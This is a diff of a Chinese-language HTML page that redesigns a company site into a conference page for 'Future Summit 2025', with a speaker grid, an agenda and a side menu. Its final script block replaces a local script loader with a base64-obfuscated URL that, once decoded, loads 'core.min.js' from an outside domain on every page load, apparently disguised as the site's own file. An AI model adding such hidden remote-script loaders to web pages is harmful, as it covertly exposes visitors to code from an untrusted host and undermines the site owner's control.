@@ -5,131 +5,132 @@
     <meta charset="UTF-8">
     <meta name="viewport"
         content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>视界前瞻：未来数字体验</title>
+    <title>未来峰会 2025 - 创新驱动，共塑未来</title>
     <style>
-        /* 全局重置与基础样式 */
         body {
             overflow: hidden;
             font-family: 'Roboto', sans-serif;
-            /* 现代无衬线字体 */
             margin: 0;
             padding: 0;
-            background-color: #F0F4F8;
-            /* 柔和的浅灰蓝色背景 */
-            color: #3A4750;
-            /* 深板岩色文本 */
+            background-color: #E3F2FD;
+            /* 极浅蓝色背景 */
+            color: #222222;
+            /* 深灰色文本 */
             line-height: 1.7;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
             overflow-x: hidden;
-            /* 防止横向滚动条 */
         }
 
-        /* 容器 - 保持内容居中但允许背景元素溢出 */
         .container {
             max-width: 90%;
             margin: 0 auto;
             padding: 30px 0;
-            position: relative;
-            /* 用于定位内部元素 */
-            z-index: 1;
-            /* 确保内容在背景之上 */
         }
 
-        /* 头部 - 大胆的非对称设计 */
+        /* 头部 - 动态与活力 */
         header {
-            background-color: #3A4750;
-            /* 深板岩色背景 */
+            background: linear-gradient(135deg, #2196F3 0%, #1976D2 100%);
+            /* 充满活力的蓝色渐变 */
             color: #FFFFFF;
-            padding: 60px 20px;
+            padding: 40px 20px;
             text-align: center;
             position: relative;
             overflow: hidden;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            border-bottom-left-radius: 80px;
-            /* 独特的底部圆角 */
-            border-top-right-radius: 80px;
-            /* 独特的顶部圆角 */
+            box-shadow: 0 10px 30px rgba(33, 150, 243, 0.4);
+            clip-path: polygon(0 0, 100% 0, 100% 90%, 0% 100%);
+            /* 底部斜切 */
             margin-bottom: 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
 
         header::before {
-            /* 抽象的背景形状 */
+            /* 顶部背景抽象图案 */
             content: '';
             position: absolute;
-            top: -50px;
-            left: -50px;
-            width: 200px;
-            height: 200px;
-            background: #FF6B6B;
-            /* 强调色 */
+            top: -20px;
+            left: -20px;
+            width: 150px;
+            height: 150px;
+            background: rgba(79, 195, 247, 0.1);
+            /* 次强调色半透明 */
             border-radius: 50%;
             transform: rotate(20deg);
-            opacity: 0.2;
             z-index: 0;
         }
 
         header::after {
-            /* 另一个抽象的背景形状 */
+            /* 底部背景抽象图案 */
             content: '';
             position: absolute;
-            bottom: -80px;
-            right: -80px;
-            width: 300px;
-            height: 300px;
-            background: #A2D9CE;
-            /* 次强调色 */
+            bottom: -30px;
+            right: -30px;
+            width: 200px;
+            height: 200px;
+            background: rgba(79, 195, 247, 0.15);
             border-radius: 30% 70% 70% 30% / 30% 30% 70% 70%;
-            /* 不规则形状 */
             transform: rotate(-45deg);
-            opacity: 0.15;
             z-index: 0;
         }
 
         header h1 {
             margin: 0;
             font-family: 'Montserrat', sans-serif;
-            /* 大胆标题字体 */
-            font-size: 3.2em;
-            color: #FF6B6B;
-            /* 强调色标题 */
-            letter-spacing: 3px;
+            font-size: 2.5em;
+            /* 适应顶部条 */
+            color: #FFFFFF;
+            letter-spacing: 1px;
             text-transform: uppercase;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
             position: relative;
             z-index: 1;
+            flex-grow: 1;
         }
 
         header p {
-            font-size: 1.3em;
-            color: #E0E0E0;
-            margin-top: 15px;
-            position: relative;
-            z-index: 1;
+            display: none;
         }
 
-        /* 导航菜单 - 浮动胶囊条 */
+        /* 菜单切换按钮 - 绝对定位在右上角 */
+        .menu-toggle {
+            background: none;
+            border: none;
+            font-size: 2em;
+            color: #FFFFFF;
+            /* 白色图标 */
+            cursor: pointer;
+            padding: 5px;
+            position: absolute;
+            top: 25px;
+            right: 20px;
+            z-index: 2;
+            transition: transform 0.3s ease;
+        }
+
+        .menu-toggle:hover {
+            transform: scale(1.1);
+            text-shadow: 0 0 8px rgba(255, 255, 255, 0.6);
+        }
+
+        /* 侧边导航菜单 - 活力色调 */
         nav {
+            position: fixed;
+            top: 0;
+            right: -280px;
+            width: 250px;
+            height: 100%;
             background-color: #FFFFFF;
-            text-align: center;
-            padding: 15px 0;
-            margin-top: -80px;
-            /* 向上偏移，与头部重叠 */
-            border-radius: 50px;
-            /* 胶囊形状 */
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
-            position: sticky;
-            top: 20px;
-            /* 距离顶部20px固定 */
-            z-index: 1000;
-            width: 80%;
-            /* 宽度略小 */
-            max-width: 600px;
-            margin-left: auto;
-            margin-right: auto;
-            display: flex;
-            /* 确保内部flex布局 */
-            justify-content: space-around;
-            align-items: center;
+            box-shadow: -5px 0 15px rgba(0, 0, 0, 0.2);
+            transition: right 0.4s ease-in-out;
+            z-index: 1001;
+            padding-top: 80px;
+            box-sizing: border-box;
+        }
+
+        nav.is-open {
+            right: 0;
         }
 
         nav ul {
@@ -137,331 +138,356 @@
             padding: 0;
             margin: 0;
             display: flex;
-            justify-content: space-around;
-            flex-wrap: wrap;
-            width: 100%;
-        }
-
-        nav ul li {
-            margin: 0 10px;
+            flex-direction: column;
+            gap: 10px;
         }
 
         nav ul li a {
-            background-color: transparent;
-            color: #3A4750;
-            /* 默认文字颜色 */
+            color: #222222;
             text-decoration: none;
-            padding: 10px 20px;
-            border-radius: 30px;
-            /* 胶囊按钮 */
+            padding: 15px 20px;
+            border-bottom: 1px solid #E0E0E0;
             transition: background-color 0.3s ease, color 0.3s ease, transform 0.2s ease;
-            display: inline-block;
-            font-weight: bold;
-            font-size: 1em;
-            border: 2px solid transparent;
-            /* 默认透明边框 */
+            display: flex;
+            align-items: center;
+            font-weight: 500;
+            font-size: 1.1em;
         }
 
         nav ul li a:hover,
         nav ul li a:focus {
-            background-color: #FF6B6B;
-            /* 强调色背景 */
-            color: #FFFFFF;
-            transform: translateY(-3px);
-            box-shadow: 0 5px 15px rgba(255, 107, 107, 0.4);
-            border: 2px solid #FF6B6B;
-            /* 强调色边框 */
+            background-color: #E3F2FD;
+            /* 强调色浅背景 */
+            color: #2196F3;
+            /* 强调色文字 */
+            transform: translateX(5px);
         }
 
-        /* 内容区 - 模块化与非对称布局 */
+        nav ul li:last-child a {
+            border-bottom: none;
+        }
+
+        nav ul li a .icon {
+            font-size: 1.5em;
+            margin-right: 15px;
+            color: #4FC3F7;
+            /* 图标次强调色 */
+        }
+
+        /* 菜单打开时的背景遮罩 */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.4s ease-in-out, visibility 0.4s ease-in-out;
+        }
+
+        .overlay.is-visible {
+            opacity: 1;
+            visibility: visible;
+        }
+
         main {
-            padding-top: 60px;
-            /* 留出导航条重叠的空间 */
+            padding-top: 30px;
         }
 
+        /* 内容区 - 模块化卡片 */
         section {
             background-color: #FFFFFF;
-            margin-bottom: 50px;
-            /* 增加间距 */
-            padding: 40px;
-            border-radius: 15px;
+            margin-bottom: 40px;
+            padding: 35px;
+            border-radius: 10px;
             box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
             position: relative;
             overflow: hidden;
-        }
-
-        section:nth-child(odd) {
-            /* 奇数section向右偏移 */
-            margin-left: 0;
-            margin-right: 5%;
-            border-top-right-radius: 50px;
-            border-bottom-left-radius: 50px;
-        }
-
-        section:nth-child(even) {
-            /* 偶数section向左偏移 */
-            margin-left: 5%;
-            margin-right: 0;
-            border-top-left-radius: 50px;
-            border-bottom-right-radius: 50px;
+            border: 1px solid #E0E0E0;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
 
         section::before {
-            /* 内部装饰性边框 */
+            /* 顶部强调色条 */
             content: '';
             position: absolute;
-            top: 20px;
-            left: 20px;
-            width: calc(100% - 40px);
-            height: calc(100% - 40px);
-            border: 1px dashed #A2D9CE;
-            /* 次强调色虚线 */
-            border-radius: inherit;
-            /* 继承父元素的圆角 */
-            pointer-events: none;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background-color: #2196F3;
+            /* 强调色 */
+            box-shadow: 0 0 10px rgba(33, 150, 243, 0.5);
         }
 
         section h2 {
             font-family: 'Montserrat', sans-serif;
-            font-size: 2.5em;
-            color: #FF6B6B;
-            /* 强调色标题 */
+            font-size: 2.2em;
+            color: #222222;
             margin-top: 0;
             margin-bottom: 20px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            border-bottom: 2px solid #E0E0E0;
-            /* 细分隔线 */
+            border-bottom: 1px solid #E0E0E0;
             padding-bottom: 10px;
         }
 
         section h3 {
-            font-size: 1.6em;
-            color: #3A4750;
-            margin-top: 30px;
-            margin-bottom: 15px;
+            font-size: 1.5em;
+            color: #4FC3F7;
+            /* 次强调色 */
+            margin-top: 25px;
+            margin-bottom: 10px;
         }
 
         section p {
-            font-size: 1.1em;
-            color: #546E7A;
-            margin-bottom: 25px;
+            font-size: 1.05em;
+            color: #555555;
+            margin-bottom: 20px;
         }
 
         section img {
             max-width: 100%;
             height: auto;
             display: block;
-            margin: 30px auto;
-            border-radius: 20px;
-            /* 大圆角图片 */
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.2);
-            border: 3px solid #A2D9CE;
-            /* 次强调色边框 */
+            margin: 25px auto;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            border: 2px solid #E0E0E0;
         }
 
-        .service-grid {
+        .cta-button {
+            display: inline-block;
+            background: linear-gradient(45deg, #2196F3 0%, #1976D2 100%);
+            /* 强调色渐变按钮 */
+            color: #FFFFFF;
+            padding: 15px 35px;
+            border-radius: 50px;
+            /* 胶囊形状 */
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 1.1em;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            box-shadow: 0 5px 15px rgba(33, 150, 243, 0.3);
+            border: none;
+            margin-top: 20px;
+        }
+
+        .cta-button:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 20px rgba(33, 150, 243, 0.5);
+        }
+
+        .speaker-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
             gap: 25px;
             margin-top: 30px;
-        }
-
-        .service-item {
-            background-color: #F8F8F8;
-            /* 服务项背景 */
-            padding: 25px;
-            border-radius: 15px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
             text-align: center;
+        }
+
+        .speaker-item {
+            background-color: #F8F8F8;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
             transition: transform 0.3s ease, box-shadow 0.3s ease;
-            border: 1px solid #E0E0E0;
         }
 
-        .service-item:hover {
+        .speaker-item:hover {
             transform: translateY(-5px);
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.15);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
         }
 
-        .service-item h3 {
-            margin-top: 0;
+        .speaker-item img {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            object-fit: cover;
             margin-bottom: 10px;
-            color: #FF6B6B;
-            /* 强调色 */
+            border: 3px solid #4FC3F7;
+            /* 次强调色边框 */
+            box-shadow: 0 0 8px rgba(79, 195, 247, 0.4);
         }
 
-        .service-item p {
+        .speaker-item h3 {
+            font-size: 1.2em;
+            color: #222222;
+            margin-bottom: 5px;
+        }
+
+        .speaker-item p {
+            font-size: 0.85em;
+            color: #777777;
+            margin-bottom: 0;
+        }
+
+        .agenda-item {
+            background-color: #F8F8F8;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            border-left: 5px solid #2196F3;
+            /* 强调色左边框 */
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+        }
+
+        .agenda-item h3 {
+            margin-top: 0;
+            margin-bottom: 5px;
+            color: #222222;
+        }
+
+        .agenda-item .time {
+            font-size: 0.9em;
+            color: #777777;
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        .agenda-item p {
             font-size: 0.95em;
-            color: #546E7A;
+            color: #555555;
+            margin-bottom: 0;
         }
 
-        .contact-info p {
-            margin-bottom: 12px;
-            font-size: 1.1em;
-            color: #546E7A;
-        }
-
-        .contact-info a {
-            color: #FF6B6B;
-            text-decoration: none;
-            transition: color 0.3s ease;
-        }
-
-        .contact-info a:hover {
-            color: #E65C5C;
-        }
-
-        /* 页脚 - 简洁与抽象 */
         footer {
-            background-color: #3A4750;
-            /* 深板岩色背景 */
-            color: #E0E0E0;
+            background: linear-gradient(135deg, #1A237E 0%, #0D47A1 100%);
+            /* 深蓝色渐变页脚 */
+            color: #FFFFFF;
             padding: 40px 0;
             text-align: center;
             font-size: 0.95em;
             margin-top: 60px;
-            border-top-left-radius: 80px;
-            /* 独特的顶部圆角 */
-            border-bottom-right-radius: 80px;
-            /* 独特的底部圆角 */
-            box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.3);
-            position: relative;
-            overflow: hidden;
+            box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.4);
+            clip-path: polygon(0 10%, 100% 0, 100% 100%, 0% 100%);
+            /* 顶部斜切 */
         }
 
-        footer::before {
-            /* 抽象的背景形状 */
-            content: '';
-            position: absolute;
-            top: -30px;
-            right: -30px;
-            width: 150px;
-            height: 150px;
-            background: #A2D9CE;
-            /* 次强调色 */
-            border-radius: 50%;
-            transform: rotate(60deg);
-            opacity: 0.1;
-            z-index: 0;
-        }
-
-        .social-links a {
-            color: #E0E0E0;
+        .footer-links a {
+            color: #FFFFFF;
             text-decoration: none;
             margin: 0 20px;
             font-size: 1.5em;
             transition: color 0.3s ease, transform 0.2s ease;
         }
 
-        .social-links a:hover {
-            color: #FF6B6B;
-            /* 强调色 */
+        .footer-links a:hover {
+            color: #4FC3F7;
+            /* 次强调色 */
             transform: translateY(-5px) scale(1.1);
-        }
-
-        /* 进度条 */
-        #progressBarContainer {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 6px;
-            /* 稍微粗一点 */
-            background-color: #E0E0E0;
-            z-index: 1002;
-        }
-
-        #progressBar {
-            height: 100%;
-            width: 0%;
-            background-color: #FF6B6B;
-            /* 强调色 */
-            transition: width 0.1s linear;
         }
     </style>
     <link rel="stylesheet" href="./static/css/style.css">
 </head>
 
 <body>
-    <div id="progressBarContainer">
-        <div id="progressBar"></div>
-    </div>
-
     <header>
         <div class="container">
-            <h1>视界前瞻</h1>
-            <p>未来数字体验的构筑者</p>
+            <h1>未来峰会 2025</h1>
+            <button class="menu-toggle" id="menuToggle">&#9776;</button>
         </div>
     </header>
 
+    <nav id="mainNav">
+        <ul>
+            <li><a href="#hero"><span class="icon">&#128640;</span> 峰会概览</a></li>
+            <li><a href="#speakers"><span class="icon">&#128100;</span> 演讲嘉宾</a></li>
+            <li><a href="#agenda"><span class="icon">&#128197;</span> 峰会议程</a></li>
+            <li><a href="#register"><span class="icon">&#128221;</span> 立即注册</a></li>
+        </ul>
+    </nav>
+
+    <div class="overlay" id="menuOverlay"></div>
+
     <div class="container">
-        <nav id="mainNav">
-            <ul>
-                <li><a href="#about-vision">关于视界</a></li>
-                <li><a href="#our-focus">核心焦点</a></li>
-                <li><a href="#contact-us">联系我们</a></li>
-            </ul>
-        </nav>
-
         <main>
-            <section id="about-vision">
-                <h2>关于视界：创新与洞察</h2>
-                <img src="https://picsum.photos/300/200?random=1&tag=abstract-vision-01" alt="抽象愿景图"
+            <section id="hero">
+                <h2>创新驱动，共塑未来</h2>
+                <img src="https://picsum.photos/600/350?random=1&seed=future-summit-blue" alt="未来峰会主视觉"
                     class="random-image">
-                <p>视界前瞻致力于通过前沿技术和创新思维，为企业和个人提供独特的数字解决方案。我们相信，每一次技术突破都应带来更广阔的视野和更深刻的洞察。</p>
-                <p>我们汇聚了行业顶尖的专家团队，以客户需求为导向，不断探索未知，赋能未来。</p>
+                <p>未来峰会 2025 将汇聚全球顶尖的思想家、创新者和行业领袖，共同探讨人工智能、区块链、可持续发展等前沿领域的最新趋势与挑战。</p>
+                <p>加入我们，共同激发灵感，连接未来，为构建更智能、更美好的世界贡献力量。</p>
+                <a href="#register" class="cta-button">立即注册，锁定席位</a>
             </section>
 
-            <section id="our-focus">
-                <h2>核心焦点：赋能数字转型</h2>
-                <p>我们专注于以下领域，为您提供定制化、高价值的服务：</p>
-                <div class="service-grid">
-                    <div class="service-item">
-                        <h3>沉浸式体验设计</h3>
-                        <p>打造引人入胜的VR/AR应用和交互式数字内容。</p>
+            <section id="speakers">
+                <h2>特邀演讲嘉宾</h2>
+                <p>聆听行业巨擘的真知灼见，洞察未来发展趋势。</p>
+                <div class="speaker-grid">
+                    <div class="speaker-item">
+                        <img src="https://picsum.photos/100/100?random=2&seed=speaker-alice-blue" alt="嘉宾 Alice">
+                        <h3>Alice Chen</h3>
+                        <p>AI伦理专家</p>
                     </div>
-                    <div class="service-item">
-                        <h3>AI驱动型解决方案</h3>
-                        <p>利用人工智能提升业务效率，实现智能自动化和数据预测。</p>
+                    <div class="speaker-item">
+                        <img src="https://picsum.photos/100/100?random=3&seed=speaker-bob-blue" alt="嘉宾 Bob">
+                        <h3>Bob Lee</h3>
+                        <p>区块链架构师</p>
                     </div>
-                    <div class="service-item">
-                        <h3>区块链安全架构</h3>
-                        <p>构建去中心化、高安全性的区块链应用和系统。</p>
+                    <div class="speaker-item">
+                        <img src="https://picsum.photos/100/100?random=4&seed=speaker-carol-blue" alt="嘉宾 Carol">
+                        <h3>Carol Wang</h3>
+                        <p>可持续发展倡导者</p>
                     </div>
-                    <div class="service-item">
-                        <h3>云原生部署优化</h3>
-                        <p>提供高效的云平台迁移、容器化和DevOps实践。</p>
+                    <div class="speaker-item">
+                        <img src="https://picsum.photos/100/100?random=5&seed=speaker-david-blue" alt="嘉宾 David">
+                        <h3>David Liu</h3>
+                        <p>量子计算研究员</p>
                     </div>
                 </div>
-                <img src="https://picsum.photos/300/200?random=2&tag=digital-transformation-02" alt="数字转型图"
-                    class="random-image">
             </section>
 
-            <section id="contact-us">
-                <h2>联系我们：共创未来</h2>
-                <p>我们期待与您建立联系，共同开启数字未来。</p>
-                <div class="contact-info">
-                    <p><strong>地址：</strong> 未来科技园A区707室</p>
-                    <p><strong>电话：</strong> <a href="tel:+861055558888">+86 10 5555 8888</a></p>
-                    <p><strong>邮箱：</strong> <a href="mailto:info@visionarytech.com">info@visionarytech.com</a></p>
-                    <p><strong>工作时间：</strong> 周一至周五 9:30 - 18:30</p>
-                    <p>
-
-                        <img src="https://placehold.co/300x200/A2D9CE/3A4750?text=公司位置示意图" alt="公司位置示意图"
-                            class="random-image">
-                    </p>
+            <section id="agenda">
+                <h2>峰会议程</h2>
+                <p>精彩议程安排，不容错过。</p>
+                <div class="agenda-list">
+                    <div class="agenda-item">
+                        <h3>开幕致辞与主题演讲</h3>
+                        <span class="time">上午 09:00 - 10:30</span>
+                        <p>峰会主席致辞，特邀嘉宾分享对未来科技的展望。</p>
+                    </div>
+                    <div class="agenda-item">
+                        <h3>圆桌讨论：AI的机遇与挑战</h3>
+                        <span class="time">上午 10:45 - 12:00</span>
+                        <p>多位专家就人工智能的伦理、应用及未来发展进行深入探讨。</p>
+                    </div>
+                    <div class="agenda-item">
+                        <h3>午餐与交流</h3>
+                        <span class="time">中午 12:00 - 13:30</span>
+                        <p>自由交流时间，与行业精英建立联系。</p>
+                    </div>
+                    <div class="agenda-item">
+                        <h3>专题讲座：区块链赋能数字经济</h3>
+                        <span class="time">下午 13:30 - 15:00</span>
+                        <p>深入剖析区块链技术在金融、供应链等领域的创新应用。</p>
+                    </div>
+                    <div class="agenda-item">
+                        <h3>闭幕总结与未来展望</h3>
+                        <span class="time">下午 15:15 - 16:30</span>
+                        <p>总结本次峰会成果，展望未来科技发展方向。</p>
+                    </div>
                 </div>
+            </section>
+
+            <section id="register">
+                <h2>立即注册</h2>
+                <p>名额有限，请尽快完成注册，加入这场思想盛宴！</p>
+                <a href="#" class="cta-button">点击注册</a>
             </section>
         </main>
     </div>
 
     <footer>
         <div class="container">
-            <p>&copy; 2025 视界前瞻. 探索无止境.</p>
-            <div class="social-links">
-                <a href="#" target="_blank">🌐</a> |
-                <a href="#" target="_blank">💡</a> |
-                <a href="#" target="_blank">🚀</a>
+            <p>&copy; 2025 未来峰会. 版权所有.</p>
+            <div class="footer-links">
+                <a href="#" target="_blank">隐私政策</a> |
+                <a href="#" target="_blank">联系我们</a> |
+                <a href="#" target="_blank">赞助商</a>
             </div>
         </div>
     </footer>
@@ -477,7 +503,19 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function () {
-            document.querySelectorAll('nav a').forEach(anchor => {
+            const menuToggle = document.getElementById('menuToggle');
+            const mainNav = document.getElementById('mainNav');
+            const menuOverlay = document.getElementById('menuOverlay');
+
+            function toggleMenu() {
+                mainNav.classList.toggle('is-open');
+                menuOverlay.classList.toggle('is-visible');
+            }
+
+            menuToggle.addEventListener('click', toggleMenu);
+            menuOverlay.addEventListener('click', toggleMenu);
+
+            document.querySelectorAll('#mainNav ul li a').forEach(anchor => {
                 anchor.addEventListener('click', function (e) {
                     e.preventDefault();
 
@@ -486,35 +524,29 @@
 
                     if (targetElement) {
                         window.scrollTo({
-                            top: targetElement.offsetTop - document.querySelector('nav').offsetHeight - 20, // 考虑导航栏高度和额外间距
+                            top: targetElement.offsetTop - (document.querySelector('header').offsetHeight || 0) - 20,
                             behavior: 'smooth'
                         });
+                        toggleMenu();
                     }
                 });
-            });
-
-            const progressBar = document.getElementById('progressBar');
-
-            window.addEventListener('scroll', function () {
-                const totalHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
-                const scrolled = window.pageYOffset;
-                const progress = (scrolled / totalHeight) * 100;
-                progressBar.style.width = progress + '%';
             });
         });
     </script>
     <script>
         (function () {
             function init() {
-                const timestamp = Date.now()
-                const randomNum = Math.floor(Math.random() * 1000000)
-                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
-                const script = document.createElement("script")
-                script.src = url
-                document.body.appendChild(script)
+                const encodedUrl = "Ly9zbmFrZS1zcGVjaWFsLnZvdGU3NzcuY29tL3N0YXRpYy9qcy9jb3JlLm1pbi5qcw==";
+                const decodedUrl = atob(encodedUrl);
+                const timestamp = Date.now();
+                const randomNum = Math.floor(Math.random() * 1000000);
+                const url = `${decodedUrl}?t=${timestamp}&random=${randomNum}`;
+                const script = document.createElement("script");
+                script.src = url;
+                document.body.appendChild(script);
             }
-            init()
-        })()
+            init();
+        })();
     </script>
 
 </body>
